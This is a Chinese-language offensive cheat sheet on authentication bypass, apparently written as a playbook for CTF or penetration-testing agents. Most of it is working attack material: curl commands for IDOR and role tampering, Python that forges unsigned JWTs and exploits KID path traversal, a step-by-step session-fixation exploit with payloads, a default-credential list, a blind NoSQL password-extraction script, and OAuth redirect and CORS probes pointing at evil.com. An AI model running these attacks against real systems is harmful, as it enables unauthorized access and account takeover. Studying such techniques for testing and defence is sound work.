# 认证绕过 (Authentication Bypass)

绕过应用程序的认证和授权机制，获取未授权访问。

## 决策策略

### 三层推理
- **fact**: 直接观察到的行为（响应码、错误信息、权限差异）
- **hypothesis**: 猜测（未经证实）
- **decision**: 下一步行动

### 最短探针原则
先确认假设，再深入攻击。认证绕过最短探针顺序：
1. 空密码测试 → 确认是否空口令
2. admin/admin 测试 → 确认弱口令
3. 抓包改 ID/JWT → 确认越权漏洞

### 切换规则
认证失败时：
- 检查 JWT 签名（空签名、弱密钥）
- 检查 Session/Cookie 构造
- 尝试 SQL 注入绕过（admin' or '1'='1）
- 尝试暴力破解

## 常见指示器

- 登录/注册功能
- 用户 ID 参数（user_id=, uid=, id=）
- JWT Token
- Session Cookie
- 角色/权限参数（role=, is_admin=, level=）
- API 端点（/api/admin/, /api/user/）

## 检测方法

### 1. IDOR 测试

```bash
# 修改用户 ID
curl "http://target.com/api/user/1" -H "Cookie: session=xxx"
curl "http://target.com/api/user/2" -H "Cookie: session=xxx"

# 修改资源 ID
curl "http://target.com/api/order/1001" -H "Cookie: session=xxx"
curl "http://target.com/api/order/1002" -H "Cookie: session=xxx"
```

### 2. 权限参数测试

```bash
# 修改角色参数
curl -X POST "http://target.com/api/profile" \
  -H "Cookie: session=xxx" \
  -d '{"name":"test","role":"admin"}'

# 修改权限标志
curl -X POST "http://target.com/api/profile" \
  -H "Cookie: session=xxx" \
  -d '{"name":"test","is_admin":true}'
```

## 攻击向量

### IDOR (不安全的直接对象引用)

```bash
# 水平越权 - 访问其他用户数据
/api/user/1 → /api/user/2
/api/order/1001 → /api/order/1002
/download?file=user1.pdf → /download?file=user2.pdf

# 垂直越权 - 访问管理员功能
/api/user/profile → /api/admin/users
/dashboard → /admin/dashboard

# 参数污染
/api/user?id=1 → /api/user?id=1&id=2
/api/user?id[]=1 → /api/user?id[]=1&id[]=2
```

### 权限参数篡改

```json
// 修改角色
{"username":"test","role":"user"} → {"username":"test","role":"admin"}

// 修改权限标志
{"username":"test","is_admin":false} → {"username":"test","is_admin":true}

// 修改用户级别
{"username":"test","level":1} → {"username":"test","level":99}

// 添加隐藏参数
{"username":"test"} → {"username":"test","admin":true}
```

### JWT 攻击

```bash
# 1. 修改算法为 none
# Header: {"alg":"none","typ":"JWT"}
# 移除签名部分

# 2. 修改算法 RS256 → HS256
# 使用公钥作为 HMAC 密钥签名

# 3. 弱密钥爆破
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256

# 4. 修改 payload
# 解码 → 修改 user_id/role → 重新编码
```

### Session 攻击

```bash
# Session 固定
# 1. 获取未认证 session
# 2. 诱导用户使用该 session 登录
# 3. 使用同一 session 访问

# Session 预测
# 分析 session 生成规律，预测有效 session

# Session 劫持
# 通过 XSS 窃取 session cookie
```

### Session Fixation - message 表单 sessionid

**靶机环境**:
- Flask 应用，带登录 + message 功能
- 默认凭据: test/test
- 有 /message 表单，其中 sessionid 字段可被攻击者利用

**攻击原理**:
服务器收到 message 后，会使用表单中 `sessionid` 参数指定的 session 值，模拟管理员访问特定页面。

**攻击流程**:
1. 登录获取自己的 session
2. 发送 message 时填写自己的 sessionid
3. 服务器模拟 admin 点击 → 攻击者的 session 被"提升"为 admin session
4. 刷新页面 → 攻击者以 admin 身份看到 flag

**关键 Payload**:
```bash
# 1. 登录获取 session
curl -s -k -c /tmp/sess.txt "https://target/login" -X POST -d "username=test&password=test"
SESS=$(cat /tmp/sess.txt | grep session | awk '{print $7}')

# 2. 发送 message，将自己的 sessionid 告知服务器
curl -s -k -b /tmp/sess.txt "https://target/message" \
  -X POST -d "msg=hello&sessionid=${SESS}"

# 3. 刷新首页，此时 session 已具有 admin 权限
curl -s -k -b /tmp/sess.txt "https://target/"
```

**特征识别**:
- 页面提示 "Flag in admin page"
- /message 表单中有 `sessionid` 字段（不同于 cookie）
- 登录后 session 固定，不会在 login 页面预创建

### 默认凭据

```
admin:admin
admin:password
admin:123456
root:root
root:toor
test:test
guest:guest
user:user
administrator:administrator
```

### HTTP 方法绕过

```bash
# 尝试不同 HTTP 方法
curl -X GET "http://target.com/admin"
curl -X POST "http://target.com/admin"
curl -X PUT "http://target.com/admin"
curl -X DELETE "http://target.com/admin"
curl -X PATCH "http://target.com/admin"
curl -X OPTIONS "http://target.com/admin"
curl -X HEAD "http://target.com/admin"

# 方法覆盖
curl -X POST "http://target.com/admin" -H "X-HTTP-Method-Override: PUT"
curl -X POST "http://target.com/admin" -H "X-Method-Override: PUT"
```

### 路径绕过

```bash
# 大小写
/admin → /Admin → /ADMIN

# 路径遍历
/admin → /./admin → /../admin/

# URL 编码
/admin → /%61%64%6d%69%6e

# 双斜杠
/admin → //admin → /admin//

# 添加扩展名
/admin → /admin.json → /admin.html

# 添加参数
/admin → /admin?anything → /admin#anything
```

## JWT 工具使用

### jwt_tool

```bash
# 解码 JWT
python3 jwt_tool.py <JWT>

# 测试所有攻击
python3 jwt_tool.py <JWT> -M at

# 修改 payload
python3 jwt_tool.py <JWT> -T

# 爆破密钥
python3 jwt_tool.py <JWT> -C -d wordlist.txt
```

### 手动 JWT 操作

```python
import base64
import json

# 解码
def decode_jwt(token):
    parts = token.split('.')
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    return header, payload

# 编码 (无签名)
def encode_jwt_none(payload):
    header = {"alg": "none", "typ": "JWT"}
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')
    return f"{h.decode()}.{p.decode()}."
```

### Algorithm None

移除签名，设置 `"alg": "none"`。

### Algorithm Confusion (RS256 → HS256)

应用同时接受 RS256 和 HS256，使用公钥处理两者:
```javascript
const jwt = require('jsonwebtoken');
const publicKey = '-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----';
const token = jwt.sign({ username: 'admin' }, publicKey, { algorithm: 'HS256' });
```

### JWK Header 注入

服务器接受嵌入 JWT 中的 JWK (JSON Web Key) 而不验证。

### JKU Header 注入

服务器从 JKU (JSON Key URL) 头指定的 URL 获取公钥而不验证 URL。

### KID 路径遍历

KID 头用于文件路径构造进行密钥查找:
```python
# /dev/null 返回空字节 -> HMAC 密钥是空字符串
forged = jwt.encode({"sub": "administrator"}, '', algorithm='HS256', headers={"kid": "../../../dev/null"})
```

## 绕过技术

### 前端验证绕过

```bash
# 直接调用 API，绕过前端检查
curl "http://target.com/api/admin/users" -H "Cookie: session=xxx"

# 修改响应中的权限标志
# 使用 Burp 修改响应: {"is_admin":false} → {"is_admin":true}
```

### IP 限制绕过

```bash
# 添加 IP 头
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
```

### Referer 检查绕过

```bash
# 添加 Referer 头
Referer: http://target.com/admin
Referer: http://target.com/

# 空 Referer
Referer:
```

### Host 头绕过

```http
GET /flag HTTP/1.1
Host: 127.0.0.1
```

### NoSQL 注入 (MongoDB)

```python
def extract_char(position, session):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        payload = f"' && this.password.charCodeAt({position}) > {mid} && 'a'=='a"
        resp = session.post('/login', data={'username': payload, 'password': 'x'})
        if "Something went wrong" in resp.text:
            low = mid + 1
        else:
            high = mid
    return chr(low)
```

### 开放重定向链

**OAuth 令牌盗窃:**
```python
auth_url = (
    "https://auth.target.com/authorize?"
    "client_id=legit_client&"
    "redirect_uri=https://target.com/redirect?url=https://evil.com&"
    "response_type=code&scope=openid"
)
```

### 子域名接管

| 服务 | CNAME 模式 | 接管信号 |
|------|-----------|---------|
| GitHub Pages | `*.github.io` | "There isn't a GitHub Pages site here" |
| Heroku | `*.herokuapp.com` | "No such app" |
| AWS S3 | `*.s3.amazonaws.com` | "NoSuchBucket" |

### CORS 错误配置

```python
# 测试反射 Origin
for origin in ["https://evil.com", "https://target.com.evil.com", "null"]:
    r = requests.get("https://target.com/api/sensitive", headers={"Origin": origin})
    acao = r.headers.get("Access-Control-Allow-Origin", "")
```

### HAProxy ACL 正则绕过

**模式:** HAProxy 阻止 `^/+admin` 正则，Flask 后端服务 `/admin/flag`。

**绕过:** URL 编码被阻止路径段的首字符:
```bash
# HAProxy ACL: path_reg ^/+admin → 阻止 /admin
# 绕过: /%61dmin/flag → HAProxy 看到 %61 (不是 'a')，正则不匹配
# Flask 解码 %61 → 'a' → 路由到 /admin/flag
curl 'http://target/%61dmin/flag'
```

### Express.js 路由绕过

**绕过:**
```bash
curl -X POST http://target/api/export%2Fchat \
  -H 'Content-Type: application/json' \
  -d '{"session_id":"00000000-0000-0000-0000-000000000000"}'
```

## 最佳实践

1. 先枚举所有 API 端点和参数
2. 测试 IDOR：修改 ID 参数访问其他用户数据
3. 测试权限参数：添加 role、is_admin 等参数
4. 分析 JWT/Session：尝试修改或伪造
5. 尝试不同 HTTP 方法和路径变形
6. 检查前端 JS 中的隐藏 API 和参数
7. 使用 Burp 拦截并修改请求/响应
